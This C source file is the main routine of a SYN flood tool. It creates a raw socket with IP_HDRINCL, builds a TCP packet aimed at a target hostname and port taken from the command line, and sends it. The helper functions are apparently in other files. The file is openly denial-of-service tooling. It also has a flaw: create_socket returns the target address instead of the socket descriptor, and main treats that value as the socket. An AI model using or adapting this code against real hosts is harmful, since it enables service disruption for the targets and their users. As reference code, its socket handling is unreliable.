/*
** main.c for main in /home/janel/Projects/templates/network/SYN_flooder
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Mon May 29 12:19:55 2017 Janel
** Last update Fri Dec  8 13:38:22 2017 
*/

#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include "syn_flooder.h"
#include "debug.h"

void		__attribute__((constructor))ctor(void)
{
  srand(time(NULL));
}

static __inline__ void	usage(const char * const prog_name)
{
  fprintf(stderr, "[-] USAGE: %s <hostname> <port>\n", prog_name);
}

/*
** Setting IP_HDRINCL on socket.
** By setting IP_HDRINCL we specify that we will
** include the IP header by ourselves in the packet.
** On some OS's, IPPROTO_RAW will not set IP_HDRINCL
** automatically.
*/
static __inline__ char	set_header_ip_inclusion(const int sd)
{
  return ((setsockopt(sd, IPPROTO_IP, IP_HDRINCL,
		      &(int){1}, sizeof(int)))
	  ? (PRINT_ERROR("setsockopt: "), FALSE) : (TRUE));
}

/*
** In this function, we create a (L3) socket
** We also set the destination address + we specify
** that we will include the IP header by ourselves
*/
static int	create_socket(struct sockaddr_in *destination_address,
			      const char *target_ip,
			      const int port)
{
  int		sd;

  if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1
      || !set_header_ip_inclusion(sd))
    return (PRINT_ERROR("Socket creation:"), INADDR_NONE);
  destination_address->sin_family = AF_INET;
  destination_address->sin_port = htons(port);
  return ((destination_address->sin_addr.s_addr = inet_addr(target_ip)));
}

int			main(int argc, char *argv[])
{
  int			sd;
  unsigned char		packet[IP_MAXPACKET] = {0};
  struct sockaddr_in	destination_address;

  if (argc != 3)
    return (usage(argv[0]), EXIT_FAILURE);
  if ((sd = create_socket(&destination_address, argv[1], atoi(argv[2]))) == INADDR_NONE
      || !build_packet(packet, argv[1], atoi(argv[2])))
    return (close(sd), EXIT_FAILURE);

  return (send_packet(sd, packet, &destination_address), close(sd));
}
